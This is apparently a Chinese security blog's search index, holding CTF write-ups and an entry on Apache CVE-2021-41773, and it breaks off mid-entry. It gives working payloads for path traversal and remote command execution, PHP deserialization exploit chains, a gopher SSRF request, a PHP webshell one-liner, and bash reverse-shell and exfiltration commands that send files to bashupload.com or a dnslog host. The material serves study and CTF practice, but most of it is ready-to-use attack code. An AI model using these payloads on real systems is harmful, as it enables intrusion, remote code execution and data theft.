<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2021-41773</title>
    <link href="/2021/11/29/CVE-2021-41773/"/>
    <url>/2021/11/29/CVE-2021-41773/</url>
    
    <content type="html"><![CDATA[<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>仅apache 2.4.49</p><h2 id="apache-目录穿越"><a href="#apache-目录穿越" class="headerlink" title="apache 目录穿越"></a>apache 目录穿越</h2><p>payload：<code>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p><p><code>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p><h2 id="apache-rce"><a href="#apache-rce" class="headerlink" title="apache rce"></a>apache rce</h2><p>需要启用<code>mod_cgid</code>和<code>mod_cgi</code>模块</p><p><code>mod_cgi</code>模块的功能是根据输入脚本类型选择不同解析器进行执行，常用的解析器有<code>php</code>、<code>perl</code>等</p><p>payload:</p><pre><code>POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1Host: xx.xx.xx.xx:8080User-Agent: curl/7.64.1Accept: */*Content-Length: 7Content-Type: application/x-www-form-urlencodedConnection: closeecho;id</code></pre><p><img src="https://s3.bmp.ovh/imgs/2021/11/0e261738473bf027.png"></p><p><a href="https://blog.csdn.net/qq_38376348/article/details/120655436">CVE-2021-41773 Apache HTTP Server漏洞复现</a>   </p><p><a href="https://mp.weixin.qq.com/s/mx7_wTnU7IWxzeG7e6faTQ?st=A3E9947CC72763237BE9E767B200882D1648B7C0060F65A11B588C63933F3FDB30F9CE3EEDF8A35AD341979ED668A754DD5F1E2AFCB710029B6DC92BC1A87C0DA439302C4A4AB04FFDE6CC47D2FBA6A5F1A0F2E0EB04443FC9F5A55F12409243D5C0711080FFD5BC323D747C57AEC1B39E37427C6A70C7C19BED4BF6C9C75FCCA459EE690735F1E2A7D4293A25537FCD92375C7254420FB4056BC664796B47A34A1900D539AC737D5321803DC0FB4CE1&vid=1688851090137202&cst=BD2948FD4785C65961435AA26F6775293D3B23260F41BE812666D55A2B47E6459197EF59B0467B11CD18458E3E28819A&deviceid=579d18aa-691c-4ffd-8a54-deef2535f414&version=3.1.16.90294&platform=mac">CVE-2021-41773升华篇-Apache HTTP Server 路径穿越漏洞提升至RCE回显深入分析 </a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Geekchallenge</title>
    <link href="/2021/11/26/geekchallenge/"/>
    <url>/2021/11/26/geekchallenge/</url>
    
    <content type="html"><![CDATA[<h2 id="temp"><a href="#temp" class="headerlink" title="temp"></a>temp</h2><p>这道不是极客大挑战的，就写这里吧</p><pre><code class="hljs php">&lt;html&gt;&lt;!--<span class="hljs-keyword">if</span>($_REQUEST[<span class="hljs-string">&#x27;mode&#x27;</span>]!=<span class="hljs-string">&quot;begin&quot;</span>)&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Welcome PHP Games!&quot;</span>);&#125;--&gt;&lt;/html&gt;<span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;fl4g.php&#x27;</span>;<span class="hljs-keyword">if</span>($_REQUEST[<span class="hljs-string">&#x27;mode&#x27;</span>]!=<span class="hljs-string">&quot;begin&quot;</span>)&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;PHP Games!&quot;</span>);&#125;<span class="hljs-keyword">else</span>&#123;    show_source(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">last_task</span></span>&#123;        <span class="hljs-keyword">var</span> $left;        <span class="hljs-keyword">var</span> $middle;        <span class="hljs-keyword">var</span> $right;    &#125;    $a=$_GET[<span class="hljs-string">&#x27;a&#x27;</span>];    $b=$_GET[<span class="hljs-string">&#x27;b&#x27;</span>];    <span class="hljs-keyword">if</span>($a==$b)&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong way&quot;</span>);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">if</span>(md5($a)!==md5($b))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;need a little magic&quot;</span>);        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">&#x27;token&#x27;</span>])&#123;                $token = unserialize($_POST[<span class="hljs-string">&#x27;token&#x27;</span>]);                <span class="hljs-keyword">if</span>($token[<span class="hljs-string">&#x27;user&#x27;</span>]==<span class="hljs-string">&quot;user&quot;</span>&amp;&amp;$token[<span class="hljs-string">&#x27;pass&#x27;</span>]==<span class="hljs-string">&quot;pass&quot;</span>)&#123;                        $flag=$_POST[<span class="hljs-string">&#x27;flag&#x27;</span>];                        <span class="hljs-keyword">if</span>($flag)&#123;                            $flag = unserialize(urldecode($flag));                            $flag-&gt;middle = $fl4g;                            <span class="hljs-keyword">if</span>($flag-&gt;middle===$flag-&gt;left&amp;&amp;$flag-&gt;middle===$flag-&gt;right)&#123;                                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is your flag &quot;</span>.$flag-&gt;middle;                            &#125;<span class="hljs-keyword">else</span>&#123;                                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;one more step&quot;</span>);                            &#125;                        &#125;<span class="hljs-keyword">else</span>&#123;                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;don&#x27;t give up&quot;</span>);                        &#125;                &#125;<span class="hljs-keyword">else</span>&#123;                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not a valid token&quot;</span>);                &#125;            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;give me the token&quot;</span>);            &#125;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>主要是最后一关<br>exp:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">last_task</span></span>&#123;    <span class="hljs-keyword">var</span> $left;    <span class="hljs-keyword">var</span> $middle;    <span class="hljs-keyword">var</span> $right;&#125;$a=<span class="hljs-keyword">new</span> last_task();$a-&gt;left=&amp;$a-&gt;middle;$a-&gt;right=&amp;$a-&gt;left;<span class="hljs-keyword">echo</span> serialize($a);<span class="hljs-meta">?&gt;</span></code></pre><p>取地址<code>&amp;</code>符号可太行了，我怎么想不到呢。。。。。。。。</p><h2 id="babyPOP"><a href="#babyPOP" class="headerlink" title="babyPOP"></a>babyPOP</h2><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $Do_u_like_JiaRan = <span class="hljs-literal">false</span>;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $Do_u_like_AFKL = <span class="hljs-literal">false</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span> </span>&#123;    <span class="hljs-keyword">private</span> $i_want_2_listen_2_MaoZhongDu;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span> (a::$Do_u_like_AFKL) &#123;            <span class="hljs-keyword">return</span> exec(<span class="hljs-keyword">$this</span>-&gt;i_want_2_listen_2_MaoZhongDu);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;</span>);        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">c</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        a::$Do_u_like_JiaRan = <span class="hljs-literal">true</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">d</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        a::$Do_u_like_AFKL = <span class="hljs-literal">true</span>;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;关注嘉然,&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;value;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">e</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span> (a::$Do_u_like_JiaRan) &#123;            (<span class="hljs-keyword">$this</span>-&gt;afkl)();        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;</span>);        &#125;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;    unserialize(base64_decode($_GET[<span class="hljs-string">&#x27;data&#x27;</span>]));&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre><p>一道反序列化，值得注意的是，static变量不能被反序列化<br>所以在写exp时就不能带<code>class a</code>了</p><p>exp:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span> </span>&#123;    <span class="hljs-keyword">private</span> $i_want_2_listen_2_MaoZhongDu;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;i_want_2_listen_2_MaoZhongDu=$a;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">c</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $Do_u_like_JiaRan = <span class="hljs-literal">true</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">d</span> </span>&#123;    <span class="hljs-comment">//$this.value=new b();</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $Do_u_like_AFKL = <span class="hljs-literal">true</span>;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;关注嘉然,&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;value;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">e</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span> ($Do_u_like_JiaRan) &#123;            (<span class="hljs-keyword">$this</span>-&gt;afkl)();        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;</span>);        &#125;    &#125;&#125;$b = <span class="hljs-keyword">new</span> b(<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/[vps-ip]/9999 0&gt;&amp;1&quot;&#x27;</span>);$c = <span class="hljs-keyword">new</span> c();$d = <span class="hljs-keyword">new</span> d();$d-&gt;value = $b;$e = <span class="hljs-keyword">new</span> e();$e-&gt;afkl = $d;<span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize([$c,$e]))).<span class="hljs-string">&quot;\n&quot;</span>;</code></pre><p>最后将c和e作为一个数组进行序列化，也就是这里是两个入口，以前做的反序列化都是找一个入口，然后一步一步推，原来还可以两个一起，属实是学废了</p><p>还有就是关于反弹shell，我一开始弹，端口在阿里云也开了，就是弹不出来，甚至怀疑自己买了假的服务器，之后突然想到服务器上安了宝塔，看了一眼，果然，宝塔的防火墙端口没开，打开就弹出来了，wssb</p><p>dnslog带出<code>curl `cat /flag|base64`.xxxxxx.dnslog.cn</code></p><h2 id="期末不挂科就算成功"><a href="#期末不挂科就算成功" class="headerlink" title="期末不挂科就算成功"></a>期末不挂科就算成功</h2><p><img src="https://s3.bmp.ovh/imgs/2021/11/a087dd443ee23e03.png"><br>注释中发现<code>/debug.php</code><br>进入后是用文件包含，伪协议读取下<code>index.php</code><br>额外信息：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_GET[<span class="hljs-string">&#x27;url&#x27;</span>]);<span class="hljs-comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span>curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);<span class="hljs-comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span>curl_exec($ch);curl_close($ch);<span class="hljs-comment">//你当前位于学校172.17.0.0/24网段下 其实还有台机子里面可以修改成绩 我偷偷告诉你password是123456,name是admin,//result必须要改成60 不然学校会查的！！！</span><span class="hljs-meta">?&gt;</span></code></pre><p>在<code>172.17.0.7</code>中除了先前有的还出现了一张图片，应该就是这里了，然后就不会了。<br>看WP要<code>gopher</code>协议<code>post</code></p><pre><code>POST /index.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 36name=admin&amp;password=123456&amp;result=60</code></pre><p>进行两次url编码，然后开头加上<code>gopher://172.17.0.7:80/_</code></p><p>值得注意的是，直接两次url编码每行的末尾是<code>%250a</code>也就是只有一个换行符，改成<code>%250D%250A</code>-换行回车</p><p>payload：<code>http://106.55.154.252:8010/?url=gopher://172.17.0.7:80/_POST%2520%252Findex.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Aname%253Dadmin%2526password%253D123456%2526result%253D60%250d%250A</code></p><h2 id="成全"><a href="#成全" class="headerlink" title="成全"></a>成全</h2><p><code>ThinkPHP v5.0.12</code><br>报错出现了<code>debug</code>界面<br><img src="https://s3.bmp.ovh/imgs/2021/11/24dded7c8682ffb6.png"></p><p>tp的默认日志文件形式为<code>/202110/11.log</code>文件夹为年加月，文件为日</p><p>对月(1-12)和天(1-31)进行交集爆破<br><img src="https://s3.bmp.ovh/imgs/2021/11/c912d29924a29513.png"><br>结果<br><img src="https://s3.bmp.ovh/imgs/2021/11/d23301543298d305.png"><br>在第一个日志中有写好的一句话</p><pre><code>&lt;?php eval($_POST[&#39;Syccccc&#39;]);phpinfo(); ?&gt;</code></pre><p>然后通过shell读取flag</p><h2 id="easyPOP"><a href="#easyPOP" class="headerlink" title="easyPOP"></a>easyPOP</h2><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;test-&gt;test();    &#125;&#125;<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span> </span>&#123;    <span class="hljs-keyword">private</span> $b = <span class="hljs-number">1</span>;    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params"></span>)</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>) </span>&#123;        (<span class="hljs-keyword">$this</span>-&gt;b)();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">c</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">b</span> </span>&#123;    <span class="hljs-keyword">private</span> $call;    <span class="hljs-keyword">protected</span> $value;    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (is_array(<span class="hljs-keyword">$this</span>-&gt;value)) &#123;            (<span class="hljs-keyword">$this</span>-&gt;call)(<span class="hljs-keyword">$this</span>-&gt;value);        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can&#x27;t do this :(&quot;</span>);        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">d</span> </span>&#123;    <span class="hljs-keyword">public</span> $value;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eval</span>(<span class="hljs-params">$call</span>) </span>&#123;        $call(<span class="hljs-keyword">$this</span>-&gt;value);    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;    unserialize(base64_decode($_GET[<span class="hljs-string">&#x27;data&#x27;</span>]));&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre><p>exp:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $test;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;test = $a;    &#125;&#125;<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">private</span> $b = <span class="hljs-number">1</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;b = $a;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">c</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">b</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">private</span> $call;    <span class="hljs-keyword">protected</span> $value;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a, $b</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;call = $a;        <span class="hljs-keyword">$this</span>-&gt;value = $b;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setB</span>(<span class="hljs-params">$c</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-built_in">parent</span>::__construct($c);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">d</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $value;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;value = $a;    &#125;&#125;$c = <span class="hljs-keyword">new</span> c(    [<span class="hljs-keyword">new</span> d(<span class="hljs-string">&quot;system&quot;</span>), <span class="hljs-string">&quot;eval&quot;</span>],    [<span class="hljs-keyword">new</span> d(<span class="hljs-string">&quot;whoami&quot;</span>), <span class="hljs-string">&quot;eval&quot;</span>],);$c-&gt;setB([$c, <span class="hljs-string">&quot;eval&quot;</span>]);$exp = <span class="hljs-keyword">new</span> a($c);<span class="hljs-keyword">echo</span> base64_encode(serialize($exp));</code></pre><p>执行流程：</p><pre><code>class a的test=new c(),调用c的test(),c继承于b,会先调d的test(),而b中的$b被设为[$c, &quot;eval&quot;],然后就会调用c的eval()函数，而$this-&gt;call=[new d(&quot;system&quot;), &quot;eval&quot;],$this-&gt;value=[new d(&quot;whoami&quot;), &quot;eval&quot;],然后($this-&gt;call)($this-&gt;value)就变成了([new d(&quot;system&quot;), &quot;eval&quot;])([new d(&quot;whoami&quot;), &quot;eval&quot;]);第一次进入到d中，d的$this-&gt;value=system,$call=[new d(&quot;whoami&quot;), &quot;eval&quot;];$call($this-&gt;value)就成了[new d(&quot;whoami&quot;), &quot;eval&quot;] (&quot;system&quot;)第二次进入d中,d的$this-&gt;value=whoami,$call=system,$call($this-&gt;value)就成了(&quot;system&quot;)(&quot;whoami&quot;)</code></pre><p>关于为啥<code>[$c, &quot;eval&quot;]</code>就能执行<code>c</code>的<code>eval</code>函数</p><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;123&quot;</span>;    &#125;&#125;$dd=[<span class="hljs-keyword">new</span> aa(),<span class="hljs-string">&quot;fun&quot;</span>]();     <span class="hljs-comment">//输出 123      [&quot;aa&quot;,&quot;fun&quot;]()这样也可以</span></code></pre><p>还有就是<code>([new d(&quot;system&quot;), &quot;eval&quot;])([new d(&quot;whoami&quot;), &quot;eval&quot;])</code>这个，后面的<code>[new d(&quot;whoami&quot;), &quot;eval&quot;]</code>被当作eval的参数传进去了</p><p>看一个简单的</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;    <span class="hljs-keyword">public</span> $c1;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$qq</span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;c1=$qq;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bb</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params">$aadd</span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;34&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;        var_dump($aadd);    &#125;&#125;$b=<span class="hljs-keyword">new</span> aa([<span class="hljs-keyword">new</span> bb(),<span class="hljs-string">&quot;fun&quot;</span>]([<span class="hljs-string">&quot;123&quot;</span>]));</code></pre><p>输出</p><pre><code>34array(1) &#123;[0]=&gt;string(3) &quot;123&quot;&#125;</code></pre><p>所以在一个数组中，<code>[new a(),&quot;fff&quot;]()</code>就相当于<code>new a()-&gt;ff()</code>,当然，后面的<code>()</code>里也可以加参数，如果需要的话</p><p><code>php是世界上最好的语言✔（￣︶￣）↗　</code></p><h2 id="where-is-my-FUMO"><a href="#where-is-my-FUMO" class="headerlink" title="where_is_my_FUMO"></a>where_is_my_FUMO</h2><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">chijou_kega_no_junnka</span>(<span class="hljs-params">$str</span>) </span>&#123;    $black_list = [<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot; &quot;</span>];    <span class="hljs-keyword">return</span> str_replace($black_list, <span class="hljs-string">&quot;&quot;</span>, $str);&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;DATA&#x27;</span>])) &#123;    $data = $_GET[<span class="hljs-string">&#x27;DATA&#x27;</span>];    $addr = chijou_kega_no_junnka($data[<span class="hljs-string">&#x27;ADDR&#x27;</span>]);    $port = chijou_kega_no_junnka($data[<span class="hljs-string">&#x27;PORT&#x27;</span>]);    exec(<span class="hljs-string">&quot;bash -c \&quot;bash -i &lt; /dev/tcp/<span class="hljs-subst">$addr</span>/<span class="hljs-subst">$port</span>\&quot;&quot;</span>);&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre><p>反弹shell，但是是个无回显的shell,可以无回显shell中执行反弹shell命令，再次反弹到VPS的另一个端口</p><p><code>bash -i &gt;&amp; /dev/tcp/IP/2233 0&gt;&amp;1</code></p><p>flag在<code>/flag.png</code>中</p><p>可以这样<code>curl bashupload.com -T /flag.png</code> </p><p><code>bashupload.com</code>是一个用来传输服务器文件的网站</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111301202589.png"><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111301203952.png"></p><p>下载即可</p><ul><li>第二种方法<br>传到自己的服务器上<br><code>cat /flag.png &gt;&amp; /dev/tcp/IP/2233 0&gt;&amp;1</code></li></ul><p><code>nc -lvnp 2233 &gt; /var/flag.png</code></p><h2 id="Baby-PHP-Black-Magic-Enlightenment"><a href="#Baby-PHP-Black-Magic-Enlightenment" class="headerlink" title="Baby_PHP_Black_Magic_Enlightenment"></a>Baby_PHP_Black_Magic_Enlightenment</h2><p>第一关：</p><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PHP is the best Language &lt;br/&gt;&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have you ever heard about PHP Black Magic&lt;br/&gt;&quot;</span>;error_reporting(<span class="hljs-number">0</span>);$temp = $_GET[<span class="hljs-string">&#x27;password&#x27;</span>];is_numeric($temp)?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no way&quot;</span>):<span class="hljs-literal">NULL</span>;    <span class="hljs-keyword">if</span>($temp&gt;<span class="hljs-number">9999</span>)&#123;    <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&#x27;./2.php&#x27;</span>);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;How&#x27;s that possible&quot;</span>;&#125; highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">//Art is long, but life is short. So I use PHP.</span><span class="hljs-comment">//I think It`s So useful that DiaoRen Said;</span><span class="hljs-comment">//why not they use their vps !!!</span><span class="hljs-comment">//BBTZ le jiarenmen</span><span class="hljs-meta">?&gt;</span></code></pre><p><code>/?password=10000a</code></p><p>第二关：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag=getenv(<span class="hljs-string">&#x27;flag&#x27;</span>);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">&#x27;user&#x27;</span>] == $_GET[<span class="hljs-string">&#x27;pass&#x27;</span>])        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no no no no way for you to do so.&#x27;</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">&#x27;user&#x27;</span>]) === sha1($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>]))      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;G1ve u the flag&#x27;</span>.$flag);    <span class="hljs-keyword">else</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;not right&#x27;</span>;&#125;<span class="hljs-keyword">else</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Just g1ve it a try.&#x27;</span>;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-meta">?&gt;</span></code></pre><p><code>/baby_magic.php?user[]=1&amp;pass[]=2</code><br>第三关：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag=getenv(<span class="hljs-string">&#x27;fllag&#x27;</span>);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span 